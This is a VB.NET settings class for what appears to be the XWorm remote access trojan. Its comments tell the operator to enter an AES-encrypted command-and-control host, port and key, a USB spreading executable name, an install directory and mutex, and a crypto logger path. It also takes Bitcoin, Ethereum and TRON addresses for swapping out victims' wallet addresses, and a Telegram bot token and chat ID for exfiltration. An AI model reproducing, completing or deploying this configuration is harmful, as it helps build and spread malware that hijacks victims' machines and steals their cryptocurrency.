Imports System
Imports Microsoft.VisualBasic

Public Class Settings
	' Enter the host here as AES encrypted string
	Public Shared Host As String = "F/tfZzFppp9x5QHFBzGQ5g=="

	' Enter the port here as AES encrypted string
	Public Shared Port As String = "8i2B8TYZ/fJYVyZHXnyFNQ=="

	' Enter the encryption key here as AES encrypted string, make sure the key matches the one you use in the settings
	Public Shared KEY As String = "nMNn7EkSZBLlLvxkG47f7w=="

	' Leave this like it is, its always <Xwormmm>
	Public Shared SPL As String = "FbuPiG/lAvstu/uuwwtJ4A=="

	Public Shared Sleep As Integer = 3

	' Enter AES Encrypted USB Spread name with ending .exe
	Public Shared USBNM As String = "2PSDpjsZsTat9LhxY4tRRukfxGRYMNAJhOll3SNZ8ew="

	' Installation Directory
	'	%AppData%		= AppData\Roaming
	'	%Temp%			= AppData\Local\Temp
	'	%LocalAppData%  = AppData\Local
	'	%Userprofile%   = C:\Users\Username
	'	%Public%		= C:\Users\Public
	'	%ProgramData%	= C:\ProgramData
	Public Shared InstallDir As String = "%AppData%"

	' Process Mutex, Leave it like it is or put something random in it, doesnt matter
	Public Shared Mutex As String = "qXzidyu4ousTTWUi"

	' This is not important, this is for the Crypto Logger
	Public Shared LoggerPath As String = Interaction.Environ("temp") + "\Log.tmp"

	' Enter your Bitcoin adress as AES Encrypted string
	Public Shared BTC As String = "tOx6IuMolYUhfsHJsu5Z1g=="

	' Enter your Ethereum adress as AES Encrypted string
	Public Shared ETH As String = "ndhF76qlkszHUOcQqSl5YA=="

	' Enter your TRC adress as AES Encrypted string
	Public Shared TRC As String = "7PU4ujODwq98o82/mj/DBA=="

	' Enter your Telegram Bot Token in here
	Public Shared Token As String = "NRB/KWWGer6VXNEgvpy5jQ=="

	' Enter your Telegram chat ID here
	Public Shared ChatID As String = "VByLXvlZt5Qi5B1iHDJ14Q=="
End Class
